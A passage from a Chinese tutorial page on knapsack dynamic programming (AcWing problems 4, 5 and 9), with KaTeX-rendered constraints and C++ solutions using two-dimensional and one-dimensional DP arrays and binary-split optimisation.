mathvariant="normal">_</mi><mi>i</mi><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 \lt v\_i, w\_i, s\_i \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">s</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span></p><p><strong>输入样例</strong></p><pre><code>4 51 2 32 4 13 4 34 5 2</code></pre><p><strong>输出样例：</strong></p><pre><code>10</code></pre><h3 id="二维dp数组-3">二维dp数组</h3><ul><li><p>状态计算 <code>f[i][j] = max(f[i - 1][j], f[i][j - v[i] + w[i]) </code></p><ul><li><p>按照物品i选择多次进行分类</p></li><li><p>物品i选k次 <code>f[i - 1][j - k*v[i]] + k*w[i], k = 0,1,.. s[i]</code></p></li><li><p>由于max的计算特性，无法像完全背包问题一样进行优化</p></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN], s[kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;v[i], &amp;w[i], &amp;s[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= s[i] &amp;&amp; k * v[i] &lt;= j; k++) &#123;</span><br><span class="line">        f[i][j] = <span class="built_in">max</span>(f[i][j], f[i - <span class="number">1</span>][j - k * v[i]] + k * w[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n][m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一维dp数组">一维dp数组</h3><p><code>f[i - 1][j - k * v[i]]</code>仅用到<code>i - 1</code>层信息，可用一维dp数组优化，注意<mark>体积从大到小循环</mark>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN], s[kN];</span><br><span class="line"><span class="type">int</span> f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;v[i], &amp;w[i], &amp;s[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= <span class="number">0</span>; j--) &#123;  <span class="comment">// 体积从大到小循环</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= s[i] &amp;&amp; k * v[i] &lt;= j; k++) &#123;</span><br><span class="line">        f[j] = <span class="built_in">max</span>(f[j], f[j - k * v[i]] + k * w[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-5-多重背包问题-II">AcWing 5. 多重背包问题 II</h2><p><code>难度：中等</code></p><p>题目描述及输入输出与上题一致。</p><p><strong>数据范围</strong>：</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>N</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 &lt; N ≤ 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>V</mi><mo>≤</mo><mn>2000</mn></mrow><annotation encoding="application/x-tex">0 &lt; V ≤ 2000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2000</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>v</mi><mi>i</mi><mo separator="true">,</mo><mi>w</mi><mi>i</mi><mo separator="true">,</mo><mi>s</mi><mi>i</mi><mo>≤</mo><mn>2000</mn></mrow><annotation encoding="application/x-tex">0 &lt; vi,wi,si ≤ 2000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2000</span></span></span></span></li></ul><h3 id="二进制优化">二进制优化</h3><p>若和上题一样不进行二进制优化，则时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mi>V</mi><msub><mi>s</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(NVs_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，会到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>×</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">4\times 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>，而C++每秒大概算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>8</mn></msup></mrow><annotation encoding="application/x-tex">10^8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span>次，所以会超时。</p><p>使用二进制优化，时间复杂度变为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mi>V</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><msub><mi>s</mi><mi>i</mi></msub></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(NVlog_{s_i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>, 大概为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2.2</mn><mo>×</mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup></mrow><annotation encoding="application/x-tex">2.2\times 10^7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2.2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span>次，不会超时。</p><p>二进制优化后转化为<code>01背包</code>，使用一维dp数组代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1000</span> * <span class="number">11</span>, kM = <span class="number">2010</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN], cnt;</span><br><span class="line"><span class="type">int</span> f[kM];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="type">int</span> a, b, s;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;s);</span><br><span class="line">    <span class="type">int</span> k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt;= s) &#123;</span><br><span class="line">      cnt++;</span><br><span class="line">      v[cnt] = k * a;</span><br><span class="line">      w[cnt] = k * b;</span><br><span class="line">      s -= k;</span><br><span class="line">      k *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      cnt++;</span><br><span class="line">      v[cnt] = s * a;</span><br><span class="line">      w[cnt] = s * b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  n = cnt;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= v[i]; j--) &#123;</span><br><span class="line">      f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-9-分组背包问题">AcWing 9. 分组背包问题</h2><p><code>难度：中等</code></p><p>有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 组物品和一个容量是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 的背包。</p><p>每组物品有若干个，同一组内的物品最多只能选一个。<br>每件物品的体积是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow></mrow><annotation encoding="application/x-tex">v\_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span></span></span></span>，价值是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow></mrow><annotation encoding="application/x-tex">w\_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 是组号，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 是组内编号。</p><p>求解将哪些物品装入背包，可使物品总体积不超过背包容量，且总价值最大。</p><p>输出最大价值。</p><p><strong>输入格式</strong></p><p>第一行有两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mtext>，</mtext><mi>V</mi></mrow><annotation encoding="application/x-tex">N，V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>，用空格隔开，分别表示物品组数和背包容量。</p><p>接下来有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 组数据：</p><ul><li>每组数据第一行有一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">S\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span>，表示第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个物品组的物品数量；</li><li>每组数据接下来有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">S\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span> 行，每行有两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow><mo separator="true">,</mo><mi>w</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow></mrow><annotation encoding="application/x-tex">v\_{ij}, w\_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span></span></span></span>，用空格隔开，分别表示第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个物品组的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 个物品的体积和价值；</li></ul><p><strong>输出格式</strong></p><p>输出一个整数，表示最大价值。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>N</mi><mo separator="true">,</mo><mi>V</mi><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 \lt N, V \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>S</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 \lt S\_i \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>v</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow><mo separator="true">,</mo><mi>w</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mi>j</mi></mrow><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 \lt v\_{ij}, w\_{ij} \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span 